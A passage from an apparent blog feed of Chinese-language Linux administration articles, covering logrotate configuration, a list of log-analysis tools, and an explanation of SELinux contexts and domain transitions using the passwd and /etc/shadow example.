NVS</div><div class="line">[    0.000000] BIOS-e820: [mem 0x000000003ff00000-0x000000003fffffff] usable</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h3 id="3-4-日志转储"><a href="#3-4-日志转储" class="headerlink" title="3.4 日志转储"></a>3.4 日志转储</h3><h4 id="3-4-1-简介"><a href="#3-4-1-简介" class="headerlink" title="3.4.1 简介"></a>3.4.1 简介</h4><p>系统工作到了一定时间后，系统日志文件的内容随着时间和访问量的增加而越来越多，日志文件也越来越大。而且当日志文件超过系统控制范围时候，还会对系统性能造成影响。转储方式可以设为<strong>每年转储</strong>、<strong>每月转储</strong>、<strong>每周转储</strong>、达到一定大小转储。在 Linux 系统，经常使用 <code>logrotate</code> 工具进行日志转储，结合 <code>cron</code> 计划任务，可以轻松实现日志文件的转储。转储方式的设置由 <code>/etc/logrotate.conf</code> 配置文件控制。</p>
<p><code>logrotate</code> 程序是一个日志文件管理工具。用来把旧的日志文件删除，并创建新的日志文件，我们把它叫做 <strong>转储</strong>。我们可以根据日志文件的大小，也可以根据其天数来转储，这个过程一般通过 <code>cron</code> 程序来执行（<code>/etc/cron.daily/logrotate</code>）。<code>logrotate</code> 程序还可以用于压缩日志文件，以及发送日志到指定的E-mail 。</p>
<p>主流 Linux 发行版上都默认安装有 <code>logrotate</code> 包，如果出于某种原因， <code>logrotate</code> 没有出现在里头，你可以使用 <code>apt-get</code> 或 <code>yum</code> 命令来安装。</p>
<p>在 Debian 或 Ubuntu上安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># apt-get install logrotate cron</div></pre></td></tr></table></figure></p>
<p>在 RH 系发行版（RHEL/Fedora/CentOS等）上安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># yum install logrotate crontabs</div></pre></td></tr></table></figure></p>
<h4 id="3-4-2-配置"><a href="#3-4-2-配置" class="headerlink" title="3.4.2 配置"></a>3.4.2 配置</h4><p><code>CentOS7</code> 系统中默认的 <code>/etc/logrotate.conf</code> 文件内容是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"># see &quot;man logrotate&quot; for details</div><div class="line"># rotate log files weekly</div><div class="line">weekly</div><div class="line"></div><div class="line"># keep 4 weeks worth of backlogs</div><div class="line">rotate 4</div><div class="line"></div><div class="line"># create new (empty) log files after rotating old ones</div><div class="line">create</div><div class="line"></div><div class="line"># use date as a suffix of the rotated file</div><div class="line">dateext</div><div class="line"></div><div class="line"># uncomment this if you want your log files compressed</div><div class="line">#compress</div><div class="line"></div><div class="line"># RPM packages drop log rotation information into this directory</div><div class="line">include /etc/logrotate.d</div><div class="line"></div><div class="line"># no packages own wtmp and btmp -- we&apos;ll rotate them here</div><div class="line">/var/log/wtmp &#123;</div><div class="line">    monthly</div><div class="line">    create 0664 root utmp</div><div class="line">    size 1M</div><div class="line">    rotate 1</div><div class="line">&#125;</div><div class="line"></div><div class="line">/var/log/btmp &#123;</div><div class="line">    missingok</div><div class="line">    monthly</div><div class="line">    create 0600 root utmp</div><div class="line">    rotate 1</div><div class="line">&#125;</div><div class="line"></div><div class="line"># system-specific logs may be also be configured here.</div></pre></td></tr></table></figure></p>
<p>以上内容中部分名词解释：</p>
<blockquote>
<p><strong>weekly</strong> —— 日志将按周转储，其他可用值为 <code>daily</code>/<code>monthly</code>/<code>yearly</code>；<br><strong>rotate 4</strong> —— 一次转储4个归档日志，对于第5个，时间最久，将被删除；<br><strong>create [mode owner group]</strong> —— 转储文件时若文件不存在则创建它，<code>mode</code>为文件权限，<code>owner</code>文件属主，<code>group</code> 为文件属组；<br><strong>compress</strong> —— 在转储任务完成后，已转储的归档将用 <code>gzip</code> 进行压缩；<br><strong>dateext</strong> —— 切换后的日志文件会附加上一个短横线和 <code>YYYYMMDD</code> 格式的日期，没有这个配置项会附加一个小数点加一个数字序号；<br><strong>include</strong> —— 引用其他日志转储配置文件；<br><strong>size</strong> —— 当日志文件到达指定的大小时才转储，<code>size</code> 可以指定 <code>bytes</code> (缺省)以及<code>KB</code> (sizek)或者 <code>MB</code> (sizem)；<br><strong>missingok</strong> —— 在日志轮循期间，任何错误将被忽略，例如 <strong>文件无法找到</strong> 之类的错误。</p>
</blockquote>
<p>其实可用配置项远不止这些，全部的配置项请参考：<a href="http://linux.die.net/man/8/logrotate" target="_blank" rel="external">http://linux.die.net/man/8/logrotate</a></p>
<h2 id="4-日志统计与分析"><a href="#4-日志统计与分析" class="headerlink" title="4. 日志统计与分析"></a>4. 日志统计与分析</h2><p>Linux 系统中的日志统计与分析，主要借助于各式各样的日志辅助工具。这些工具按照面向的日志种类可分为 <strong>系统日志分析工具</strong> 和 <strong>Web日志分析工具</strong>；按照工具实现的形式可以分为 <strong>命令行工具</strong> 、 <strong>Web前端工具（以Web界面展示日志信息，类似 <code>phpMyAdmin</code>）</strong> 和 <strong>桌面工具（GUI）</strong>。下面将通过表格介绍几款常用的日志统计与分析工具：</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">形式</th>
<th style="text-align:left">面向日志种类</th>
<th style="text-align:left">特性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Xlogmaster</td>
<td style="text-align:left">桌面/命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">System Log Viewer</td>
<td style="text-align:left">桌面</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">基于 Gnome 桌面环境</td>
</tr>
<tr>
<td style="text-align:left">lwatch</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">C语言编写，性能好</td>
</tr>
<tr>
<td style="text-align:left">Webalizer</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">C语言编写，性能好；多平台；报表输出；国际化支持</td>
</tr>
<tr>
<td style="text-align:left">GoAccess</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">速度快，可即时生成报表；配置方便，支持常见 Web 服务器 Apache/Nginx/IIS</td>
</tr>
<tr>
<td style="text-align:left">Graylog2</td>
<td style="text-align:left">命令行/Web</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">将系统日志转存到 MongoDB 中，在 Web 前端显示</td>
</tr>
<tr>
<td style="text-align:left">LogAnalyzer</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">Swatch</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">logwatch</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">Analog</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">logcheck</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">自动地检查日志文件，定期检查日志文件以发现违反安全规则以及异常的活动</td>
</tr>
<tr>
<td style="text-align:left">cronolog</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web日志切割工具</td>
<td style="text-align:left"><strong>切割大日志文件</strong></td>
</tr>
<tr>
<td style="text-align:left">Awstats</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">久负盛名，功能丰富而强大</td>
</tr>
</tbody>
</table>
<p>上面只是一部分常用的日志统计与分析工具，其他还有很多，有待发掘。</p>
<p>随着 Web 应用程序越来越强大，应用越来越广，Web 日志分析技术渐渐成了独立于系统日志分析的一个庞杂分支。这其中主要得益于大数据相关技术的发展：分布式存储、并行计算、大规模实时处理系统、数据挖掘等等技术功不可没。在这种背景下，Web 日志统计与分析在 日志搜集、日志存储、日志数据挖掘和日志数据可视化方面都有了长足发展，出现了很多高性能的一体化日志分析框架，从功能和处理数据的规模来说，都不是上面单个简单的日志分析小工具所能相比的。而且不同的功能针对不同的应用场景：网站运营、服务器运维、安全分析等等。这部分内容不在此细说，想了解的可以查阅参考资料中的第 9、10、11 条连接，也可以自行查阅其他资料。</p>
<p>##5. 参考资料</p>
<ol>
<li><a href="http://www.moon-soft.com/download/info/2628.htm" target="_blank" rel="external">Linux 日志管理详解</a></li>
<li><a href="http://www.itokit.com/2012/0602/74289.html" target="_blank" rel="external">Linux 系统日志分析大全</a></li>
<li><a href="http://os.51cto.com/art/201007/211455_all.htm" target="_blank" rel="external">明明白白你的Linux服务器——日志篇</a></li>
<li><a href="http://os.51cto.com/art/200711/60313_all.htm" target="_blank" rel="external">Linux 系统常见的日志文件和常用命令</a></li>
<li><a href="http://blog.csdn.net/chaofanwei/article/details/11831819" target="_blank" rel="external">Linux 日志文件系统总结</a></li>
<li><a href="http://linux.cn/article-4126-1.html" target="_blank" rel="external">Linux 日志文件总管——logrotate</a></li>
<li><a href="http://7056824.blog.51cto.com/69854/276610" target="_blank" rel="external">Linux 中 tty、pty、pts 的概念区别</a></li>
<li><a href="http://os.51cto.com/art/201205/335040.htm" target="_blank" rel="external">Linux 中 history 历史命令使用方法详解</a></li>
<li><a href="http://drops.wooyun.org/tips/4051" target="_blank" rel="external">Web 攻击日志分析的过去现在与未来</a></li>
<li><a href="http://www.freebuf.com/articles/web/25613.html" target="_blank" rel="external">大数据安全分析：我们从日志中得到的（一）</a></li>
<li><a href="http://www.freebuf.com/articles/web/26846.html" target="_blank" rel="external">大数据安全分析：我们从日志中得到的（二）</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux 系统中的日志大概可以分为以下几类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户访问日志&lt;/li&gt;
&lt;li&gt;进程监控日志&lt;/li&gt;
&lt;li&gt;系统与服务日志&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文将对这几种日志进行详细剖析。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;:&lt;br&gt;本文中的例子，如非特殊说明，均在 &lt;code&gt;CentOS7&lt;/code&gt; 上实施。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-用户访问日志&quot;&gt;&lt;a href=&quot;#1-用户访问日志&quot; class=&quot;headerlink&quot; title=&quot;1. 用户访问日志&quot;&gt;&lt;/a&gt;1. 用户访问日志&lt;/h2&gt;&lt;p&gt;用户的登录时间日志一般由 &lt;code&gt;/var/log/wtmp&lt;/code&gt; 和 &lt;code&gt;/var/run/utmp&lt;/code&gt; 这两个文件记录，不过这两个文件无法直接 &lt;code&gt;cat&lt;/code&gt; 命令查看，并且该文件由系统自动更新。这两个文件中的内容可以用 &lt;code&gt;w/who/finger/id/last/ac/uptime&lt;/code&gt; 这几个命令来查看。 &lt;code&gt;/var/log/lastlog&lt;/code&gt; 文件记录用户最后登录的信息，可用 &lt;code&gt;lastlog&lt;/code&gt; 命令来查看。&lt;/p&gt;
    
    </summary>
    
      <category term="system" scheme="http://jiayu0x.com/categories/system/"/>
    
    
      <category term="linux" scheme="http://jiayu0x.com/tags/linux/"/>
    
      <category term="log" scheme="http://jiayu0x.com/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>Linux 权限管理与访问控制详解(2)——MAC 和 SELinux</title>
    <link href="http://jiayu0x.com/2014/12/24/Linux-authority-and-access-control-2/"/>
    <id>http://jiayu0x.com/2014/12/24/Linux-authority-and-access-control-2/</id>
    <published>2014-12-23T16:00:00.000Z</published>
    <updated>2017-04-04T10:32:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>本系列 <a href="http://jiayu0x.com/2014/12/23/Linux-authority-and-access-control/">前一篇</a> 主要介绍了 Linux 权限管理和访问控制的相关概念与 DAC 相关的 UGO+RWX、ACL，本篇续写 MAC 相关概念与知识，主要详细介绍 SELinux。</p>
<h2 id="1-强制访问控制-SELinux"><a href="#1-强制访问控制-SELinux" class="headerlink" title="1. 强制访问控制(SELinux)"></a>1. 强制访问控制(SELinux)</h2><p>前半部分讲解了Linux系统中实现的<strong>DAC</strong>(Discretionary Access Control,自主访问控制)机制，主要包括传统的<strong><code>UGO+RWX</code></strong>机制和 ACL 机制；下半部分开始讲解<strong>MAC(Mandatory Access Control，强制访问控制)</strong>，该部分主要讲 SELinux，因为 Linux 系统中的MAC机制，主要由 SELinux 来实现。</p>
<h2 id="2-SELinux简介"><a href="#2-SELinux简介" class="headerlink" title="2. SELinux简介"></a>2. SELinux简介</h2><hr>
<h3 id="2-1-起源"><a href="#2-1-起源" class="headerlink" title="2.1 起源"></a>2.1 起源</h3><p>NSA(美国国家安全局)一直非常关注计算机操作系统的安全领域，他们发现大部分操作系统的安全机制，包括Window和大部分*nix系统，都是以DAC机制为安全认证基础的。由于DAC机制的设计很不利于系统安全，NSA便一直致力于开发一套更安全的MAC操作系统安全认证机制。</p>
<a id="more"></a>
<p>DAC与MAC两种安全机制的原理与区别，在前文已叙述过，DAC的控制方式够灵活，比较松，但不严格，有一定的安全隐患。在DAC的控制机制中，传统Linux由于 <code>root</code> 权限的“权力”过大而造成巨大的安全威胁：一旦黑客入侵Linux操作系统并获得<code>root</code>权限，整个操作系统将暴露于恶意攻击的威胁之下。</p>
<p>SELinux 正是为解决这类为题而设计，它控制了无限的<code>root</code>权限，并不采用大众所知道的传统安全机制。在SELinux下，<code>root</code>账号采用强制访问控制机制，同时限制用户和程序（主体）使用最低权限做足以完成任务的工作。因此，即使系统不幸遭受黑客攻击，由此引起的危害也随之降到最低限度，所以极大地提升了Linux系统的安全性。</p>
<h3 id="2-2-SELinux-工作机制概述"><a href="#2-2-SELinux-工作机制概述" class="headerlink" title="2.2 SELinux 工作机制概述"></a>2.2 SELinux 工作机制概述</h3><p>在SELinux中，每个对象（程序、文件和进程等，包括前文所述的“主体”与“客体”）都有一个 <strong>安全上下文</strong>(Security Context)，它依附于每个对象身上，记载着该对象具有的权限（SELinux定义的权限）。管理员可以通过定制 <strong>安全策略</strong>(Security Policy)来定义这些安全上下文，从而定义哪种对象具有什么权限。当一个对象需要执行某个操作时，系统会按照该对象以及该对象要操作的对象的安全上下文所定制的安全策略来检查相对应的权限，去过全部权限都符合，系统就会允许该操作，否则将阻断这个操作。这些过程不会影响到其他正常运行的对象，系统会保证它们的安全系统结构以及稳定运行。</p>
<p><strong>SELinux 从Linux Kernel 2.6开始，就已经是内核的一部分了；传统的 <code>UGO+RWX</code> 机制也是运行在内核中；ACL 是一个POSIX标准。</strong></p>
<p>在启用了SELinux的Linux操作系统中，某个对象需要执行某个操作时，<strong>系统权限管理不仅根据安全上下文所规定的内容来检查，同时还要根据传统DAC机制来检测，并且是先通过DAC机制的检测，再由SELinux定制的安全策略来检测</strong>。只有通过DAC和SELinux的双重检测之后，才能执行操作。</p>
<p>SELinux 的另一个重要概念是 <strong>TE</strong>(Type Enforcement，类型强制)，其原理是<strong>将权限与程序的访问结合在一起，而不是结合用户</strong>。本文讨论的所有SELinux策略特性，都是处理<strong>主体</strong>(运行中的进程)对<strong>客体</strong>(文件、目录或套接字等)的访问权的，主要集中于程序访问控制决策，这也是SELinux的主要功能。它允许SELinux安全策略编写者基于程序的功能和安全属性，加上用户要完成任务所需的访问权作出访问决策，可以将程序限制到功能合适、权限最小化的程度。因此，即使它出现了故障或被攻击，但整个系统的安全并不会受到威胁。例如，一个Web服务器的策略阻止修改它显示的文件，那么即使Web服务器被攻破，TE策略也能阻止被攻破的服务器修改那些文件。这样就消除了通过Web服务器的漏洞攻击造成对整个服务器的威胁，而只有被攻破的应用程序受到影响，并且它会被我们的安全策略限制访问权限。</p>
<p>具体的系统运行中，在 SELinux 系统启动时，会加载一个叫做<code>policy.*</code>的安全策略配置文件，这个文件中就定义了SELinux设定的各种权限。如果用户在文件中设定了SELinux不能在开机后转回 <code>permissive</code>模式的话，那么系统的<code>root</code>用户则可能无法修改当前的设定，也就是说<code>root</code>用户在SELinux中已经不具有默认的所有权限。因此，即便黑客盗取了<code>root</code>用户密码并成功入侵到用户的计算机，也只能在他入侵的这个自治域内进行破坏，并不会像以前那样扩散到整个Linux系统。因此，在启用了SELinux的Linux操作系统中，<code>root</code>用户也被限制进行某些操作。</p>
<h3 id="2-3-SELinux-的优势"><a href="#2-3-SELinux-的优势" class="headerlink" title="2.3 SELinux 的优势"></a>2.3 SELinux 的优势</h3><p>总的来说，SELinux有以下几点优势：</p>
<ul>
<li>所有的进程与文件都用一个<strong>类型(Type)</strong>来标记。一个<strong>类型</strong>定义了一个进程的<strong>域(Domain)</strong>和一个文件的域。不同的进程只在自己所属的域内运行，SELinux的策略则定义了不同进程与文件、进程与进程间通信的方式。只有SELinux的策略允许，一个访问操作才可能被执行；</li>
<li>细粒度访问控制。优于传统的基于用户和组的Linux自主访问控制机制，SELinux基于一切可用信息，比如SELinux定义的<strong>用户</strong>、<strong>角色</strong>、<strong>类型</strong>和一个可选的<strong>安全等级</strong>；</li>
<li>SELinux策略是以管理方式定义的、全系统范围内有效的，不是用户自主可控的；</li>
<li>降低提权攻击的风险（上面所讲述的SELinux的主要贡献就是这个）；</li>
<li>SELinux 可以保证数据的机密性和完整性，并能防止部分外部恶意数据输入。</li>
</ul>
<p>但是，需要注意以下几点：</p>
<ul>
<li>SELinux 不是防病毒软件，也不能替代防病毒软件；</li>
<li>SELinux 不能替代基础密码、防火墙或者IDS/IPS或者其他安全防护系统；</li>
<li>SELinux 不是一体化的防护系统。</li>
</ul>
<h2 id="3-SELinux-基本工作原理"><a href="#3-SELinux-基本工作原理" class="headerlink" title="3. SELinux 基本工作原理"></a>3. SELinux 基本工作原理</h2><hr>
<h3 id="3-1-SELinux-中的上下文-Context"><a href="#3-1-SELinux-中的上下文-Context" class="headerlink" title="3.1 SELinux 中的上下文(Context)"></a>3.1 SELinux 中的上下文(Context)</h3><p>SELinux 系统中的<strong>进程</strong>和<strong>文件</strong>都标记了 SELinux 的<strong>上下文</strong>，这个上下文包含了许多有用的信息，包括<strong>SELinux用户</strong>(不同于Linux系统的用户)、<strong>角色</strong>(Role)、<strong>类型</strong>(Type)和<strong>级别</strong>(Security Level)等等。在运行 SELinux 的时候，这些上下文信息被用来辅助进行访问控制，它们可以看做是 SELinux 策略的“维度”。最新的 SELinux 综合提供了 <strong>RBAC</strong>、<strong>TE</strong>(类型增强)和 <strong>MLS</strong>(Multi-Security Level，多级别安全)三种访问控制机制。</p>
<p>下面是一个 SELinux 上下文的例子。SELinux 上下文广泛使用在 <strong>进程</strong>、<strong>Linux用户</strong>、<strong>文件</strong>中，使用 <code>ls -Z [file|dir]</code> 命令可以查看<strong>文件</strong>或<strong>目录</strong>的 SELinux 上下文：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ls -Z</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 test.txt</div></pre></td></tr></table></figure></p>
<p>SELinux 上下文的组成为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELinux user:role:type:level</div></pre></td></tr></table></figure></p>
<hr>
<p><strong>SELinux user</strong></p>
<p><code>SELinux user</code> 标志一群被授权的角色或者一个特定的 MLS 范围。每一个 Linux 系统用户都通过 SELinux 机制被映射为一个 <code>SELinux user</code>，这使得Linux用户可以继承 SELinux 用户的访问权限。这个标志主要用于限制 Linux 用户可以进入的角色和级别范围，相当于 SELinux 对 Linux 的用户结构进行了一层封装。</p>
<p>Linux 下用 <code>root</code> 用户权限运行 <code>semanage login -l</code> 命令可以查看 SELinux 用户与 Linux 用户之间的映射关系：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜ semanage login <span class="_">-l</span></div><div class="line"></div><div class="line">登录名                SELinux 用户          MLS/MCS 范围          服务</div><div class="line"></div><div class="line">__default__          unconfined_u         s0<span class="_">-s</span>0:c0.c1023        *</div><div class="line">root                 unconfined_u         s0<span class="_">-s</span>0:c0.c1023        *</div><div class="line">system_u             system_u             s0<span class="_">-s</span>0:c0.c1023        *</div></pre></td></tr></table></figure></p>
<ul>
<li>例子中第一列为 <strong>Linux 系统用户</strong>；</li>
<li>第二列的 <strong>SELinux 用户</strong>列出了第一列系统用户对应的 SELinux 用户。对于进程来说，这些 SELinux 用户直接限制了什么角色和级别可以为该用户访问；</li>
<li>第三列的 <strong>MLS/MCS 范围</strong> 则给出了 <strong>MLS</strong> 和 <strong>MCS</strong>(Multi-Category Security，多种类安全)机制所采用的 <strong>安全级别</strong>(Level)。关于 <strong>MCS</strong> 和 <strong>Level</strong>，下文详解；</li>
<li>最后一列的<strong>服务</strong>，定义了对应的<strong>Linux系统用户</strong>登录后对应的 SELinux 上下文，默认值 <code>*</code>代表任意服务。</li>
</ul>
<hr>
<p><strong>角色</strong>(Role)</p>
<p>SELinux 中有一部分采用前文介绍的<strong>基于角色的访问控制(RBAC)</strong>机制。而 <code>role</code> 是 RBAC 机制中的一个属性，也是 RBAC 机制在 SELinux 中的运用。在 SELinux 的设计中，Linux 系统用户被映射为 SELinux 用户，而 SELinux用户被授权为<strong>角色(Role)</strong>,继而<strong>角色</strong>被授权为对应的可访问的<strong>域</strong>(Domain)。所以，<strong>角色作为域和 SELinux 用户之间联系的媒介。通过角色可以决定 SELinux 用户可以访问哪些域，而最终决定了SELinux 用户可以访问哪些对象类型</strong>。通过这种机制可以降低权限提升的风险。</p>
<hr>
<p><strong>类型</strong>(Type)</p>
<p>类型是<strong>类型强制</strong>(Type Enforcement)机制的一个属性，也是 TE 机制在 SELinux 中的实现。<strong>类型</strong>为<strong>进程</strong>定义了<strong>域</strong>，为<strong>文件</strong>定义了<strong>类型</strong>。SELinux 机制策略明确定义了<strong>类型间相互访问</strong>、<strong>域访问类型</strong>和<strong>域间相互访问</strong>的规则和许可。只有存在某条 SELinux 机制规则允许的情况下，才允许上述的访问发生。</p>
<hr>
<p><strong>级别</strong>(Level)</p>
<p><strong>级别</strong>是上述 MLS 和 MCS 机制的另一个重要属性。一个 MLS 范围是一个 <strong>级别对</strong>，采用<strong>区间</strong>标志，比如 <code>(最低级别, 最高级别)</code> 或者 <code>(S0, s5)</code> 。每个级别都是一个<strong>种类</strong>(Category) 敏感的数对，然而种类是可选的。如果存在<strong>种类</strong>，则可以表示为 <code>sensitivity: category-set</code> 的形式，如果没有种类，则只用 <code>sesitivity</code> 表示即可。</p>
<p>如果<strong>种类集</strong>(category-set)是连续的，则在表示时可以简写，比如 <code>c0.c2</code> 与 <code>c0,c1,c2</code> 表示同样的含义。举例说明：在最新的 <code>CentOS7</code> 操作系统中，<strong>目标机制</strong>(Targeted Policy)对MCS进行了增强，因此它只有一个敏感级别 <code>s0</code> 。MCS 支持 1024 个不同的种类，从 <code>c0</code> 一直到 <code>c1023</code> ，所以，<code>s0-s0:c0.c1023</code> 所有的种类都被授权。</p>
<p>另外，与<strong>级别</strong>相关的 <code>/etc/selinux/targeted/setrans.conf</code> 配置文件非常重要，切记用  Vi(m)/Gedit/Nano/Emacs 等编辑器对其直接进行编辑，可以使用 <code>semanage</code> 命令进行修改，这样才能保证修改的正确性。</p>
<hr>
<p><strong>类型强制</strong>(Type Enforcement)</p>
<p>SELinux 策略大部分都是一套声明和规则一起定义的<strong>类型强制</strong>(TE)策略，一个定义良好、严格的 TE 策略可能包括上千条 TE 规则，TE 规则数量的巨大是正常现象，因为它们表达了由内核暴露出的允许对资源的访问权，这就意味着每个进程对每个资源的访问尝试都必须至少要得到一条 TE 规则的允许，考虑一下现代Linux操作系统中进程和资源的数量，就会明白为什么有这么多 TE 规则了。<br>TE 规则数量众多，但规则本身并不复杂，分类也较少，所有的规则基本上都属于两类范畴：<strong>访问向量</strong>(AV,Access Vector)和<strong>类型规则</strong>。AV规则允许或审核两个类型之间的访问权，而某些情况下使用类型规则控制默认的标记。</p>
<p>由于 TE 规则数量较多，全部加载比较耗费资源，每次检索也会比较费性能，所以，在 SELinux 运行的过程中，系统实现了一个 <strong>访问向量缓存</strong>(Access Vector Cache)，用来存放已经查询过的规则，提高性能。</p>
<p>正如<strong>类型强制</strong>的名字所示，TE 规则通过安全上下文与所有资源结合起来对<strong>类型</strong>起作用，策略语言包括了另外的允许我们定义类型及其策略组件的语句。SELinux 不会管Linux系统用户，可以给同一个程序指定多个域类型（因此有不同的特权集），这样就允许引入<strong>角色</strong>的概念。因此，<strong>访问控制的标准仍然是基于程序的域类型而不是基于用户的域类型。</strong></p>
<h3 id="3-2-域转换-Domain-Transitions"><a href="#3-2-域转换-Domain-Transitions" class="headerlink" title="3.2 域转换(Domain Transitions)"></a>3.2 域转换(Domain Transitions)</h3><p>前文介绍过，SELinux 一大特点就是将进程和用户的执行权限限定在一个<strong>域</strong>(Domain)内。因此，即使 <code>root</code> 用户也不可能具有太大权限，从而保证了系统整体的安全性。<strong>SELinux 中定义的 <code>域</code> 会限定进程的执行权限或范围，但进程执行的时候是可以从一个域转换到另外一个域的，以获得另外一个域内限定的权限。</strong>进程从一个域转换到另一个域需要执行一个具有新域的<strong>入口点</strong>(Entrypoint)权限的应用程序来实现。这个“入口点”许可在 SELinux 机制中使用，它用来控制某些应用程序可以用来进入一个<strong>域</strong>。为了清楚说明这个问题，下面举实例说明。</p>
<p>一个用户想要修改自己的密码。为了修改密码，应该运行 <code>passwd</code> 程序，<code>/usr/bin/passwd</code> 可执行命令的标记 <code>passwd_exec_t</code> 类型，如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ls -Z /usr/bin/passwd </div><div class="line">-rwsr-xr-x. root root system_u:object_r:passwd_exec_t:s0 /usr/bin/passwd</div></pre></td></tr></table></figure></p>
<p>在实际执行过程中，该命令访问了 <code>/etc/shadow</code> 文件，该文件的类型为 <code>shodow_t</code>，如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ls -Z /etc/shadow</div><div class="line">----------. root root system_u:object_r:shadow_t:s0    /etc/shadow</div></pre></td></tr></table></figure></p>
<p>SELinux 机制的相关规则规定：运行在 <code>passwd_t</code> <strong>域</strong>(<strong>域</strong>，是 TE 机制为<strong>进程</strong>定义的权限范围；<code>passwd_t</code>域，即是<code>/usr/bin/passwd</code>程序运行时的进程所处的<strong>域</strong>)的进程对标记为 <code>shadow_t</code> <strong>类型</strong>（<strong>类型</strong>，是 TE 机制为<strong>文件</strong>定义的权限范围）的文件具有读和写的权限。并且， <code>shadow_t</code> 类型仅仅只赋予和密码修改相关的那些文件，这些文件包括 <code>/etc/gshadow</code> 、<code>/etc/shadow</code> 以及它们的备份文件。根据这个规则，用户可以知道：<code>passwd_t</code> 域的进程具有 <code>passwd_exec_t</code> 类型的 <code>入口点</code> 权限。因此，当用户运行 <code>/usr/bin/passwd</code> 程序修改密码时，该程序启动的进程运行在 <code>passwd_t</code> 域；由于 <code>passwd_t</code> 域的进程可以对 <code>shadow_t</code> 类型的文件进行读写操作，所以 <code>passwd</code> 命令的进程可以操作 <code>/etc/shadow</code> 文件。</p>
<p>当然，在 SELinux 机制中，如果默认情况下（没有相应规则），该进程是无法访问相应文件的。可以进一步解释这个例子：未使用 SELinux 的 Linux 操作系统中，<code>/usr/binpasswd</code> 程序是可信的，因而可以修改经过加密的密码文件 <code>/etc/shadow</code>。所以，<code>passwd</code> 程序执行它自己内部的安全策略，允许普通用户修改自己的密码，同时也允许 <code>root</code> 修改所有的密码。为了执行这个密码修改操作，<code>passwd</code>程序需要有移动和重新创建<code>shadow</code>文件的能力。在标准 Linux 系统中，它具有这个特权，因为 <code>/usr/bin/passwd</code> 在执行时被加上了 <code>setuid</code> 位，它作为 <code>root</code> 用户被允许对密码进行修改操作。然而，许多程序都可以作为 <code>root</code> 允许（实际上，所有程序都有可能作为 <code>root</code> 允许）。这就意味着任何程序（当以 <code>root</code> 身份运行时）都有可能修改 <code>/etc/shadow</code> 文件。因此，类型强制使用户能做的事情是确保只有 <code>/usr/bin/passwd</code> 程序（或类似受信程序）可以操作 <code>/etc/shadow</code> 文件，而不论运行程序的用户是谁。</p>
<p>在上述例子中，除 SELinux 的相关规则约定外，TE 机制在很大程度上保证下面几条前提条件：</p>
<ul>
<li>只有标记为 <code>passwd_exec_t</code> 类型的应用程序执行才能进入 <code>passwd_t</code> 域，其他的命令执行时都不允许进入该域；</li>
<li>只有一些授权的域，比如 <code>passwd_t</code> 才能对 <code>shadow_t</code> 类型的文件具有读写权限。及时其他的进程具有超级用户的权限，也不允许对 <code>shadow_t</code> 类型的文件具有写权限，因为它们并不运行在 <code>passwd_t</code> 域中；</li>
